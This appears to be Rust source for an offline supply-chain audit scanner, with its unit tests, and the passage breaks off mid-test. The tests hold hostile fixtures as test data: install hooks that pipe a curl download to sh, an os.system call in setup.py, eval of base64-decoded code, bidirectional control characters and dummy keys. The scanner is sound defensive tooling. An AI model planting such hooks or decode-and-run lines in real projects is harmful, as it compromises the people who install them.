//! Supply-chain red flags.
//!
//! A quick, offline scan for patterns that often show up in malicious or
//! compromised repositories: install scripts that download and run code,
//! decoded strings passed to `eval`, executables checked in as source,
//! hidden Unicode that makes code read differently from how it runs,
//! hardcoded credentials and dependency names one typo away from a popular
//! package.
//!
//! The result is a list of things to review, not a safety verdict: clean
//! code can trip a check and a careful attacker can avoid all of them.
//! Each finding carries a severity (how bad it would be) and a confidence
//! (how likely it is a real problem rather than a false alarm). Findings in
//! tests, docs, examples, fixtures, vendored libraries and translations are
//! lowered one step on both, since that is not code the project's users run
//! or its authors wrote. Keys there are usually dummies, so they drop to low
//! confidence, and long or encoded data in tests, fixtures, vendored
//! libraries and translations is not reported at all.
//!
//! Files are only read, never executed, and nothing is sent over the network
//! unless dependency checking is asked for (see [`crate::vulns`]): then the
//! names and versions in lockfiles, and nothing else, go to osv.dev.
//! Secret values are never included in the output, only the kind of secret
//! and its line.

use crate::architecture::Confidence;
use crate::safe_text::sanitize;
use rayon::prelude::*;
use serde::Serialize;
use std::path::Path;

mod context;
mod rules;
mod usage;

use context::{context_of, is_fixture_data, lower};
use rules::audit_file;
pub(crate) use rules::secrets::find_secrets;
#[cfg(test)]
use rules::{
    minified::LONG_LINE,
    secrets::{PEM_BEGIN, PEM_PRIVATE},
    typosquat::edit_distance,
};

/// Most findings returned; the risk score still counts all of them.
pub const MAX_FINDINGS: usize = 200;
/// Most findings kept per file, so one generated file cannot fill the list.
const PER_FILE_LIMIT: usize = 20;

pub const SECRET: &str = "secret";
pub const HIDDEN_UNICODE: &str = "hidden-unicode";
pub const INSTALL_SCRIPT: &str = "install-script";
pub const OBFUSCATION: &str = "obfuscation";
pub const BINARY: &str = "binary";
pub const MINIFIED: &str = "minified";
pub const TYPOSQUAT: &str = "typosquat";
pub const VULNERABLE_DEPENDENCY: &str = "vulnerable-dependency";

/// How much a finding matters.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Low,
    Medium,
    High,
}

impl Severity {
    pub fn name(self) -> &'static str {
        match self {
            Severity::Low => "low",
            Severity::Medium => "medium",
            Severity::High => "high",
        }
    }

    pub fn from_name(name: &str) -> Option<Severity> {
        match name {
            "low" => Some(Severity::Low),
            "medium" => Some(Severity::Medium),
            "high" => Some(Severity::High),
            _ => None,
        }
    }

    fn weight(self) -> u32 {
        match self {
            Severity::Low => 2,
            Severity::Medium => 10,
            Severity::High => 25,
        }
    }
}

/// One red flag.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Finding {
    pub severity: Severity,
    /// How likely the finding is a real problem rather than a false alarm.
    pub confidence: Confidence,
    /// Which check found it, e.g. `secret` or `install-script`.
    pub check: &'static str,
    /// Path relative to the audited folder.
    pub file: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
    pub message: String,
    /// Set when the file is a test, doc, example or fixture, e.g. `test`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub context: Option<&'static str>,
    /// What the rule saw, apart from how bad it would be (`severity`) and
    /// how often such a finding is real (`confidence`).
    pub evidence: Evidence,
    /// The package and advisories behind a `vulnerable-dependency` finding.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub dependency: Option<DependencyEvidence>,
}

/// How much a rule actually saw: `strong` evidence is the pattern itself
/// (a key in a documented format, decoded data passed to `eval`, a
/// download piped to a shell), `weak` is a hint that is often innocent.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Strength {
    Weak,
    Moderate,
    Strong,
}

/// The evidence behind a finding.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Evidence {
    pub strength: Strength,
    /// Short statements of what raised or lowered the finding, such as
    /// `format: GitHub token` or `read by src/server.ts`. Never a secret
    /// value.
    pub signals: Vec<String>,
}

/// The package, version and advisories a dependency finding is about.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct DependencyEvidence {
    pub ecosystem: &'static str,
    pub name: String,
    pub version: String,
    /// Advisory ids, worst first.
    pub advisories: Vec<String>,
    /// The lowest version that fixes every listed advisory, when known.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub fixed: Option<String>,
}

impl Finding {
    /// Add a signal to the evidence.
    pub(crate) fn signal(mut self, signal: impl Into<String>) -> Finding {
        self.evidence.signals.push(signal.into());
        self
    }

    /// Mark the evidence weak, with the reason: such findings are usually
    /// innocent, so their confidence is low.
    pub(crate) fn weak(mut self, why: impl Into<String>) -> Finding {
        self.weaken(why);
        self
    }

    pub(crate) fn weaken(&mut self, why: impl Into<String>) {
        self.evidence.strength = Strength::Weak;
        self.confidence = Confidence::Low;
        self.evidence.signals.push(why.into());
    }
}

/// One check and whether it ran.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct CheckRun {
    pub check: &'static str,
    pub ran: bool,
    /// Findings of this check, before the `MAX_FINDINGS` cap.
    pub findings: usize,
    /// What the check covers, or why it did not run.
    pub note: String,
}

/// The checks a scan runs, with what each covers.
const CHECKS: &[(&str, &str)] = &[
    (
        SECRET,
        "documented token formats and PEM private keys in every text file",
    ),
    (
        HIDDEN_UNICODE,
        "bidirectional controls in every text file, invisible characters in code",
    ),
    (
        OBFUSCATION,
        "decoded data run as code, hex-escaped strings and encoded blobs in the project's own code",
    ),
    (MINIFIED, "very long lines in code"),
    (BINARY, "executables and libraries checked in as source"),
    (
        INSTALL_SCRIPT,
        "npm lifecycle scripts, setup.py and build.rs",
    ),
    (
        TYPOSQUAT,
        "package.json and requirements*.txt names against popular packages",
    ),
];

/// What the audit does and does not tell you.
pub const NOTE: &str = "Red flags to review, not a safety verdict. The scan matches known patterns: clean code can trip a check, and code that passes is not proven safe. Each finding keeps severity (how bad if real), evidence strength (what the rule saw) and confidence apart. Findings in tests, docs, examples, fixtures, vendored libraries and translations are lowered one step; where a key sits explains it but does not excuse it. Secret values are never included; files are read, never run.";

/// All findings plus a summary score.
#[derive(Debug, Clone, Serialize)]
pub struct AuditReport {
    pub note: &'static str,
    pub files_scanned: usize,
    /// 0–100: high findings count 25, medium 10, low 2, capped at 100.
    pub risk_score: u32,
    /// The highest severity found, or `none`.
    pub risk_level: &'static str,
    /// Findings before the `MAX_FINDINGS` cap.
    pub total_findings: usize,
    /// `true` when findings were cut to `MAX_FINDINGS`.
    pub truncated: bool,
    /// Findings lowered because they are in tests, docs, examples or fixtures.
    pub lowered: usize,
    /// Each check, whether it ran and what it covers. A check that ran and
    /// found nothing did not prove anything safe.
    pub checks: Vec<CheckRun>,
    /// Set when dependencies were checked against OSV.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub dependencies: Option<DependencySummary>,
    /// Set when a baseline was applied: the findings above are the new ones.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub baseline: Option<crate::baseline::Applied>,
    pub findings: Vec<Finding>,
}

/// What the dependency check covered.
#[derive(Debug, Clone, Serialize)]
pub struct DependencySummary {
    /// Distinct package versions checked.
    pub packages_checked: usize,
    /// Lockfiles read, relative to the audited folder.
    pub lockfiles: Vec<String>,
    /// The advisory database queried.
    pub database: &'static str,
    /// When it was queried (UTC, RFC 3339): advisories published later are
    /// not covered.
    pub checked_at: String,
    /// `checked`, `no-lockfile` or `error`.
    pub status: &'static str,
    /// Set when the vulnerability database could not be reached.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

impl AuditReport {
    /// Whether any finding is at or above `level`.
    pub fn has_at_least(&self, level: Severity) -> bool {
        self.findings.iter().any(|f| f.severity >= level)
    }
}

/// Audit every file under `root` that the scanner would read. When
/// `dependencies` is given, also check lockfile versions against that
/// vulnerability database.
pub fn audit(root: &Path, dependencies: Option<&dyn crate::vulns::Source>) -> AuditReport {
    scan(root, dependencies).report(None)
}

/// Every finding, before any baseline or cap.
pub struct Scan {
    pub files_scanned: usize,
    pub findings: Vec<Finding>,
    pub dependencies: Option<DependencySummary>,
}

impl Scan {
    /// The report, leaving out the findings `baseline` accepts.
    pub fn report(mut self, baseline: Option<&crate::baseline::Baseline>) -> AuditReport {
        let applied = baseline.map(|b| b.filter_audit(&mut self.findings));
        let mut report = finish(self.files_scanned, self.findings);
        if let Some(run) = report
            .checks
            .iter_mut()
            .find(|c| c.check == VULNERABLE_DEPENDENCY)
        {
            dependency_run(run, self.dependencies.as_ref());
        }
        report.dependencies = self.dependencies;
        report.baseline = applied;
        report
    }
}

/// Audit like [`audit`], keeping every finding so a baseline can be
/// applied or written.
pub fn scan(root: &Path, dependencies: Option<&dyn crate::vulns::Source>) -> Scan {
    let files = crate::scanner::scan_repository(root);
    let findings: Vec<Finding> = files
        .par_iter()
        .flat_map_iter(|path| {
            let Ok(bytes) = std::fs::read(path) else {
                return Vec::new();
            };
            let relative = path.strip_prefix(root).unwrap_or(path);
            let relative = sanitize(&relative.to_string_lossy().replace('\\', "/"));
            let mut found = audit_file(&relative, &bytes);
            let context = context_of(&relative);
            // Expected there: long lines in bundles and expected output,
            // encoded sample data, direction marks in Arabic or Hebrew text.
            if matches!(
                context,
                Some("test" | "fixture" | "vendored" | "translation")
            ) {
                found.retain(|f| !is_fixture_data(f));
            }
            found.truncate(PER_FILE_LIMIT);
            if let Some(context) = context {
                for f in &mut found {
                    lower(f, context);
                }
            }
            found
        })
        .collect();
    let mut findings = findings;
    // A key's folder explains it but does not excuse it: what decides is
    // whether the project's own code uses it.
    usage::weigh_secrets(root, &files, &mut findings);
    let summary = dependencies.map(|source| {
        let check = crate::vulns::check(root, source);
        findings.extend(check.findings);
        let status = if check.error.is_some() {
            "error"
        } else if check.lockfiles.is_empty() {
            "no-lockfile"
        } else {
            "checked"
        };
        DependencySummary {
            packages_checked: check.packages,
            lockfiles: check
                .lockfiles
                .iter()
                .map(|l| crate::analysis::dotted(l))
                .collect(),
            database: "osv.dev",
            checked_at: utc_now(),
            status,
            error: check.error,
        }
    });
    Scan {
        files_scanned: files.len(),
        findings,
        dependencies: summary,
    }
}

fn finish(files_scanned: usize, mut findings: Vec<Finding>) -> AuditReport {
    for f in &mut findings {
        f.file = crate::analysis::dotted(&f.file);
    }
    findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| b.confidence.cmp(&a.confidence))
            .then_with(|| a.file.cmp(&b.file))
            .then_with(|| a.line.cmp(&b.line))
            .then_with(|| a.check.cmp(b.check))
    });
    let risk_score = findings
        .iter()
        .map(|f| f.severity.weight())
        .sum::<u32>()
        .min(100);
    let risk_level = findings.first().map_or("none", |f| f.severity.name());
    let total_findings = findings.len();
    let lowered = findings.iter().filter(|f| f.context.is_some()).count();
    let count = |check: &str| findings.iter().filter(|f| f.check == check).count();
    let mut checks: Vec<CheckRun> = CHECKS
        .iter()
        .map(|&(check, note)| CheckRun {
            check,
            ran: true,
            findings: count(check),
            note: note.to_string(),
        })
        .collect();
    let mut deps = CheckRun {
        check: VULNERABLE_DEPENDENCY,
        ran: false,
        findings: count(VULNERABLE_DEPENDENCY),
        note: String::new(),
    };
    dependency_run(&mut deps, None);
    checks.push(deps);
    let truncated = total_findings > MAX_FINDINGS;
    findings.truncate(MAX_FINDINGS);
    AuditReport {
        note: NOTE,
        files_scanned,
        risk_score,
        risk_level,
        total_findings,
        truncated,
        lowered,
        checks,
        dependencies: None,
        baseline: None,
        findings,
    }
}

/// Fill in whether the dependency check ran, from its summary (`None`
/// when it was not asked for).
fn dependency_run(run: &mut CheckRun, deps: Option<&DependencySummary>) {
    let (ran, note) = match deps {
        None => (
            false,
            "not requested: run with --deps to check lockfile versions against osv.dev".to_string(),
        ),
        Some(d) if d.error.is_some() => (false, d.error.clone().unwrap_or_default()),
        Some(d) if d.lockfiles.is_empty() => (false, "no supported lockfile found".to_string()),
        Some(d) => (
            true,
            format!(
                "{} package versions from {} lockfile{} against {} at {}",
                d.packages_checked,
                d.lockfiles.len(),
                if d.lockfiles.len() == 1 { "" } else { "s" },
                d.database,
                d.checked_at
            ),
        ),
    };
    run.ran = ran;
    run.note = note;
}

/// The current time as RFC 3339 UTC, to the second.
fn utc_now() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| d.as_secs());
    let (days, rest) = (secs / 86_400, secs % 86_400);
    // Days since 1970-01-01 to a civil date (Howard Hinnant's algorithm).
    let z = days as i64 + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1_460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let day = doy - (153 * mp + 2) / 5 + 1;
    let month = if mp < 10 { mp + 3 } else { mp - 9 };
    let year = yoe + era * 400 + i64::from(month <= 2);
    format!(
        "{year:04}-{month:02}-{day:02}T{:02}:{:02}:{:02}Z",
        rest / 3_600,
        rest % 3_600 / 60,
        rest % 60
    )
}

pub(crate) fn finding(
    severity: Severity,
    check: &'static str,
    file: &str,
    line: Option<usize>,
    message: String,
) -> Finding {
    Finding {
        severity,
        confidence: base_confidence(check, severity),
        check,
        file: file.to_string(),
        line,
        message,
        context: None,
        evidence: Evidence {
            strength: base_strength(check, severity),
            signals: Vec::new(),
        },
        dependency: None,
    }
}

/// How much each kind of check sees, before anything about the file or
/// its use is considered.
fn base_strength(check: &str, severity: Severity) -> Strength {
    match (check, severity) {
        (SECRET | VULNERABLE_DEPENDENCY, _) => Strength::Strong,
        (HIDDEN_UNICODE | INSTALL_SCRIPT | OBFUSCATION, Severity::High) => Strength::Strong,
        (HIDDEN_UNICODE | INSTALL_SCRIPT | OBFUSCATION, Severity::Medium) => Strength::Moderate,
        (BINARY | TYPOSQUAT, _) => Strength::Moderate,
        _ => Strength::Weak,
    }
}

/// How sure each kind of check is, before the file's context is considered.
fn base_confidence(check: &str, severity: Severity) -> Confidence {
    match (check, severity) {
        // Secrets match exact token formats and skip obvious placeholders.
        (SECRET, _) => Confidence::High,
        // Bidirectional controls have almost no business in source code.
        (HIDDEN_UNICODE, Severity::High) => Confidence::High,
        (HIDDEN_UNICODE, _) => Confidence::Medium,
        // Install hooks and build scripts that download things are often
        // legitimate (prebuilt binaries, native builds).
        (INSTALL_SCRIPT, Severity::Low) => Confidence::Low,
        (INSTALL_SCRIPT, _) => Confidence::Medium,
        (OBFUSCATION, Severity::Low) => Confidence::Low,
        (OBFUSCATION, _) => Confidence::Medium,
        (TYPOSQUAT, _) => Confidence::Medium,
        (VULNERABLE_DEPENDENCY, _) => Confidence::High,
        (BINARY, _) => Confidence::Medium,
        _ => Confidence::Low,
    }
}

// ---------------------------------------------------------------------------
// Output
// ---------------------------------------------------------------------------

/// Plain-text listing for the terminal.
pub fn render_text(report: &AuditReport) -> String {
    let mut out = String::from("\n");
    out.push_str(&format!(
        "  Audit: {} file{}, {} finding{}, risk {}/100 ({})\n\n",
        report.files_scanned,
        if report.files_scanned == 1 { "" } else { "s" },
        report.total_findings,
        if report.total_findings == 1 { "" } else { "s" },
        report.risk_score,
        report.risk_level,
    ));
    if let Some(deps) = &report.dependencies {
        match &deps.error {
            Some(error) => out.push_str(&format!("  Dependencies not checked. {error}\n\n")),
            None if deps.lockfiles.is_empty() => {
                out.push_str("  Dependencies not checked: no supported lockfile found.\n\n")
            }
            None => out.push_str(&format!(
                "  Checked {} package version{} from {} against osv.dev.\n\n",
                deps.packages_checked,
                if deps.packages_checked == 1 { "" } else { "s" },
                if deps.lockfiles.len() <= 3 {
                    deps.lockfiles.join(", ")
                } else {
                    format!("{} lockfiles", deps.lockfiles.len())
                },
            )),
        }
    }
    if let Some(applied) = report.baseline {
        out.push_str(&crate::baseline::summary(applied, "finding"));
        out.push_str("\n\n");
        if report.findings.is_empty() {
            out.push_str("  No new findings.\n\n");
            return out;
        }
    }
    if report.findings.is_empty() {
        out.push_str("  No red flags found by the checks for secrets, hidden Unicode,\n");
        out.push_str("  obfuscation, minified code, binaries, install scripts and typosquats.\n");
        if report.dependencies.is_none() {
            out.push_str("  Dependencies were not checked for known vulnerabilities (--deps).\n");
        }
        out.push_str(
            "  This is not a safety verdict: the checks only look for known patterns.\n\n",
        );
        return out;
    }
    for f in &report.findings {
        let place = match f.line {
            Some(line) => format!("{}:{line}", f.file),
            None => f.file.clone(),
        };
        let context = match f.context {
            Some(kind) => format!(", {kind} file"),
            None => String::new(),
        };
        out.push_str(&format!(
            "  {:<6}  {place}  ({} confidence{context})\n          {}\n",
            f.severity.name().to_ascii_uppercase(),
            f.confidence.as_str(),
            f.message
        ));
    }
    if report.truncated {
        out.push_str(&format!(
            "\n  Showing the first {MAX_FINDINGS} of {} findings.\n",
            report.total_findings
        ));
    }
    if report.lowered > 0 {
        out.push_str(&format!(
            "\n  {} finding{} in tests, docs, examples, fixtures, vendored libraries or translations {} lowered one step.\n",
            report.lowered,
            if report.lowered == 1 { "" } else { "s" },
            if report.lowered == 1 { "was" } else { "were" },
        ));
    }
    out.push_str("\n  Red flags to review, not a safety verdict: clean code can trip a check\n");
    out.push_str("  and code that passes is not proven safe. Secret values are never printed.\n\n");
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn checks(findings: &[Finding]) -> Vec<&'static str> {
        findings.iter().map(|f| f.check).collect()
    }

    #[test]
    fn context_lowers_severity_and_confidence() {
        assert_eq!(context_of("tests/test_api.py"), Some("test"));
        assert_eq!(context_of("src/app.test.ts"), Some("test"));
        assert_eq!(context_of("docs/setup.md"), Some("docs"));
        assert_eq!(context_of("README.md"), Some("docs"));
        assert_eq!(context_of("examples/basic/main.rs"), Some("example"));
        assert_eq!(context_of("testdata/key.pem"), Some("fixture"));
        assert_eq!(context_of(".env.example"), Some("example"));
        assert_eq!(context_of("requirements.txt"), None);
        assert_eq!(context_of("src/latest/config.py"), None);
        assert_eq!(context_of("src/config.py"), None);
        assert_eq!(context_of("site/guide/keys.mdx"), Some("docs"));
        assert_eq!(context_of("content/github.markdoc"), Some("docs"));
        assert_eq!(context_of("scripts/mock-api/data.json"), Some("fixture"));
        assert_eq!(
            context_of(".yarn/releases/yarn-4.1.0.cjs"),
            Some("vendored")
        );
        assert_eq!(context_of("vendor/javascript/d3.js"), Some("vendored"));
        assert_eq!(context_of("static/libs/backbone-min.js"), Some("vendored"));
        assert_eq!(context_of("static/swagger-ui-bundle.js"), Some("vendored"));
        assert_eq!(
            context_of("src/locales/generated/fi.ts"),
            Some("translation")
        );
        assert_eq!(
            context_of("app/lang/translations/ar.yaml"),
            Some("translation")
        );
        assert_eq!(context_of("src/minimal.js"), None);

        let key = format!("{}{}", "AK", "IAZ7Q4K2M9P1R8T3V6");
        let mut found = audit_file("tests/conftest.py", format!("k = \"{key}\"").as_bytes());
        assert_eq!(found[0].confidence, Confidence::High);
        lower(&mut found[0], "test");
        assert_eq!(found[0].severity, Severity::Medium);
        assert_eq!(found[0].confidence, Confidence::Medium);
        let report = finish(1, found);
        assert_eq!(report.lowered, 1);
        let text = render_text(&report);
        assert!(text.contains("(medium confidence, test file)"));
        assert!(text.contains("not a safety verdict"));
    }

    #[test]
    fn audit_lowers_findings_in_tests() {
        let dir = tempfile::tempdir().unwrap();
        let key = format!("{}{}", "AK", "IAZ7Q4K2M9P1R8T3V6");
        fs::create_dir_all(dir.path().join("src")).unwrap();
        fs::create_dir_all(dir.path().join("tests")).unwrap();
        fs::write(dir.path().join("src/app.py"), format!("k = \"{key}\"\n")).unwrap();
        fs::write(dir.path().join("tests/fake.py"), format!("k = \"{key}\"\n")).unwrap();
        let report = audit(dir.path(), None);
        assert_eq!(report.findings.len(), 2);
        assert_eq!(report.findings[0].file, "./src/app.py");
        assert_eq!(report.findings[0].severity, Severity::High);
        assert_eq!(report.findings[0].context, None);
        assert_eq!(report.findings[1].severity, Severity::Medium);
        assert_eq!(report.findings[1].context, Some("test"));
        assert_eq!(report.risk_level, "high");
        let json = serde_json::to_value(&report).unwrap();
        assert!(json["note"]
            .as_str()
            .unwrap()
            .contains("not a safety verdict"));
        assert_eq!(json["findings"][0]["confidence"], "high");
    }

    #[test]
    fn audit_quiets_vendored_code_translations_and_docs() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let key = format!("{}{}", "AK", "IAZ7Q4K2M9P1R8T3V6");
        let rlo = '\u{202E}';
        for folder in [".yarn/releases", "locales", "docs", "src"] {
            fs::create_dir_all(root.join(folder)).unwrap();
        }
        let bundle = format!("var a=1;{}\n", "x+=1;".repeat(LONG_LINE));
        fs::write(root.join(".yarn/releases/yarn.cjs"), &bundle).unwrap();
        fs::write(
            root.join("locales/ar.ts"),
            format!("export default {{ a: \"{rlo}x\" }};\n"),
        )
        .unwrap();
        fs::write(root.join("docs/setup.mdx"), format!("AWS_KEY={key}\n")).unwrap();
        fs::write(root.join("src/app.js"), format!("if (a {rlo}) run();\n")).unwrap();
        let report = audit(root, None);
        let files: Vec<(&str, Option<&str>, Confidence)> = report
            .findings
            .iter()
            .map(|f| (f.file.as_str(), f.context, f.confidence))
            .collect();
        // The bundle's long line is expected. A key in docs is lowered one
        // step, never dismissed: docs do leak live keys.
        assert!(
            !files.iter().any(|(f, ..)| f.contains(".yarn")),
            "{files:?}"
        );
        assert!(files.contains(&("./docs/setup.mdx", Some("docs"), Confidence::Medium)));
        // Direction marks in a translation are lowered, never in app code.
        assert!(files
            .iter()
            .all(|(f, c, _)| !f.contains("locales") || *c == Some("translation")));
        let app = report
            .findings
            .iter()
            .find(|f| f.file == "./src/app.js")
            .unwrap();
        assert_eq!((app.check, app.context), (HIDDEN_UNICODE, None));
    }

    #[test]
    fn finds_secrets_without_printing_them() {
        let key = format!("{}{}", "AK", "IAZ7Q4K2M9P1R8T3V6");
        let line = format!("aws_key = \"{key}\"");
        let found = audit_file("config.py", line.as_bytes());
        assert_eq!(checks(&found), vec![SECRET]);
        assert_eq!(found[0].severity, Severity::High);
        assert_eq!(found[0].line, Some(1));

        let report = finish(1, found);
        let text = render_text(&report);
        let json = serde_json::to_string(&report).unwrap();
        assert!(!text.contains(&key) && !json.contains(&key));
        assert!(!text.contains("Z7Q4K2M9P1R8T3V6"));
    }

    #[test]
    fn secret_rules_need_full_length_and_skip_examples() {
        let github = format!("{}{}", "gh", "p_");
        assert_eq!(
            find_secrets(&format!(
                "t = {github}{}",
                "aB3dE5gH7jK9mN1pQ3sT5vW7yZ9bC1dE3fG5"
            )),
            vec!["GitHub token"]
        );
        assert!(find_secrets(&format!("t = {github}short")).is_empty());
        assert!(find_secrets(&format!("{}{}", "AKIA", "IOSFODNN7EXAMPLE")).is_empty());
        assert!(find_secrets(&format!("{}{}", "sk_live_", "x".repeat(30))).is_empty());
        let pem = format!("{}RSA {}", PEM_BEGIN, PEM_PRIVATE);
        assert_eq!(find_secrets(&pem), vec!["private key"]);
    }

    #[test]
    fn private_keys_need_key_material() {
        let header = format!("{}RSA {}", PEM_BEGIN, PEM_PRIVATE);
        let body = "MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8";
        let real = format!("key = \"{header}\\n{body}\\n\"");
        assert_eq!(checks(&audit_file("app.ts", real.as_bytes())), vec![SECRET]);
        let split = format!("{header}\n{body}\n");
        assert_eq!(
            checks(&audit_file("server.key", split.as_bytes())),
            vec![SECRET]
        );
        for fake in [
            format!("p = \"{header}\\n...\\n\""),
            format!("// Usually wrapped within {header} X -----END PRIVATE KEY-----."),
            format!("{header}\nMIIEpAIBAAKCAQEA...\n"),
        ] {
            assert!(audit_file("app.ts", fake.as_bytes()).is_empty(), "{fake}");
        }
    }

    #[test]
    fn firebase_web_keys_are_low() {
        let key = format!("{}{}", "AIza", "SyAd15pYlMci_xIp9ko6wkEsDzAAA0Dn0RU");
        let found = audit_file(
            ".env",
            format!("FIREBASE_CONFIG='{{\"apiKey\":\"{key}\"}}'").as_bytes(),
        );
        assert_eq!(found[0].severity, Severity::Low);
        assert_eq!(found[0].confidence, Confidence::Low);
        let found = audit_file(".env", format!("MAPS_KEY={key}").as_bytes());
        assert_eq!(found[0].severity, Severity::High);
    }

    #[test]
    fn skips_patterns_bundlers_and_drawings_produce() {
        let minified = format!(
            "{}({}('YWxlcnQoMSk='));var s=\"{}\"",
            "Function",
            "atob",
            "\\x41".repeat(50)
        );
        assert!(audit_file("lib/jquery.min.js", minified.as_bytes()).is_empty());
        assert!(audit_file("vendor/d3.js", minified.as_bytes()).is_empty());
        assert!(audit_file("lib/raphael-min.js", minified.as_bytes()).is_empty());

        let wasm = format!("export default toBinary(`AGFzbQ{}`);", "QUJD".repeat(150));
        assert!(audit_file("woff2-wasm.ts", wasm.as_bytes()).is_empty());

        let path = format!("<path d=\"M{}\" />", "12.5 3.4-1.2 ".repeat(500));
        assert!(audit_file("Logo.tsx", path.as_bytes()).is_empty());
    }

    #[test]
    fn tests_and_fixtures_hold_dummy_keys_and_data() {
        let dir = tempfile::tempdir().unwrap();
        let header = format!("{}RSA {}", PEM_BEGIN, PEM_PRIVATE);
        let body = "MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8";
        fs::create_dir_all(dir.path().join("tests/certs")).unwrap();
        fs::write(
            dir.path().join("tests/certs/server.key"),
            format!("{header}\n{body}\n"),
        )
        .unwrap();
        fs::write(
            dir.path().join("tests/expected_test.go"),
            format!("var q = \"{}\"\n", "SELECT a ".repeat(800)),
        )
        .unwrap();
        let report = audit(dir.path(), None);
        assert_eq!(checks(&report.findings), vec![SECRET]);
        assert_eq!(report.findings[0].confidence, Confidence::Low);
    }

    #[test]
    fn private_packages_install_hooks_are_their_own() {
        let pkg = r#"{"private": true, "scripts": {"postinstall": "prisma generate"}}"#;
        assert!(audit_file("package.json", pkg.as_bytes()).is_empty());
        let risky = format!(
            r#"{{"private": true, "scripts": {{"postinstall": "{} https://x.sh | sh"}}}}"#,
            "curl"
        );
        assert_eq!(audit_file("package.json", risky.as_bytes()).len(), 1);
    }

    #[test]
    fn flags_bidi_controls_in_code() {
        let src = "let ok = true; // \u{202E} } \u{2066}\nok";
        let found = audit_file("src/lib.rs", src.as_bytes());
        assert_eq!(checks(&found), vec![HIDDEN_UNICODE]);
        assert_eq!(found[0].severity, Severity::High);
        let docs = audit_file("README.md", src.as_bytes());
        assert_eq!(docs[0].severity, Severity::Low);
    }

    #[test]
    fn flags_zero_width_but_not_a_leading_bom() {
        let found = audit_file("a.js", "\u{FEFF}const a = 1;\n".as_bytes());
        assert!(found.is_empty());
        let found = audit_file("a.js", "const a\u{200B}b = 1;\n".as_bytes());
        assert_eq!(checks(&found), vec![HIDDEN_UNICODE]);
    }

    #[test]
    fn flags_decode_then_eval() {
        let line = format!("{}({}('YWxlcnQoMSk='))", "eval", "atob");
        let found = audit_file("x.js", line.as_bytes());
        assert_eq!(checks(&found), vec![OBFUSCATION]);
        assert_eq!(found[0].severity, Severity::High);
        assert!(audit_file("x.md", line.as_bytes()).is_empty());
    }

    #[test]
    fn flags_blobs_and_long_lines_once() {
        let blob = format!(
            "const b = \"{}\";\nconst c = \"{}\";",
            "QUJD".repeat(150),
            "QUJD".repeat(150)
        );
        let found = audit_file("x.js", blob.as_bytes());
        assert_eq!(checks(&found), vec![OBFUSCATION]);

        let long = format!("var a=[{}];", "f(b),".repeat(1_200));
        assert_eq!(checks(&audit_file("x.js", long.as_bytes())), vec![MINIFIED]);
        assert!(audit_file("x.min.js", long.as_bytes()).is_empty());

        let escapes = format!("s = \"{}\"", "\\x41".repeat(50));
        assert_eq!(
            checks(&audit_file("x.py", escapes.as_bytes())),
            vec![OBFUSCATION]
        );
    }

    #[test]
    fn flags_executables_and_ignores_other_binaries() {
        let mut elf = b"\x7fELF".to_vec();
        elf.extend([0u8; 60]);
        let found = audit_file("tools/helper", &elf);
        assert_eq!(checks(&found), vec![BINARY]);

        let mut pe = vec![0u8; 0x80];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3c] = 0x40;
        pe[0x40..0x44].copy_from_slice(b"PE\0\0");
        assert_eq!(checks(&audit_file("a.dll", &pe)), vec![BINARY]);

        let png = [0x89u8, b'P', b'N', b'G', 0, 0, 0, 0];
        assert!(audit_file("logo.png", &png).is_empty());
    }

    #[test]
    fn flags_risky_install_scripts() {
        let pkg = format!(
            r#"{{
  "name": "x",
  "scripts": {{
    "postinstall": "{} https://example.com/a.sh | sh",
    "preinstall": "node check.js",
    "prepare": "husky install",
    "test": "jest"
  }}
}}"#,
            "curl"
        );
        let found = audit_file("package.json", pkg.as_bytes());
        let report = finish(1, found);
        assert_eq!(report.findings.len(), 2);
        assert_eq!(report.findings[0].severity, Severity::High);
        assert_eq!(report.findings[0].line, Some(4));
        assert_eq!(report.findings[1].severity, Severity::Low);
        assert_eq!(report.risk_level, "high");
    }

    #[test]
    fn flags_setup_py_and_build_rs() {
        let setup = "import os\n# os.system( in a comment\nos.system('id')\n";
        let found = audit_file("setup.py", setup.as_bytes());
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].line, Some(3));

        let build = "fn main() {\n    std::process::Command::new(\"cc\");\n}\n";
        let found = audit_file("build.rs", build.as_bytes());
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].severity, Severity::Low);
    }

    #[test]
    fn flags_typosquats() {
        let pkg = r#"{"dependencies": {"react": "^18", "reakt": "1", "preact": "10", "gaxios": "6", "@types/react": "18", "lodahs": "1"}}"#;
        let found = audit_file("package.json", pkg.as_bytes());
        let names: Vec<&str> = found.iter().map(|f| f.message.as_str()).collect();
        assert_eq!(found.len(), 2, "{names:?}");
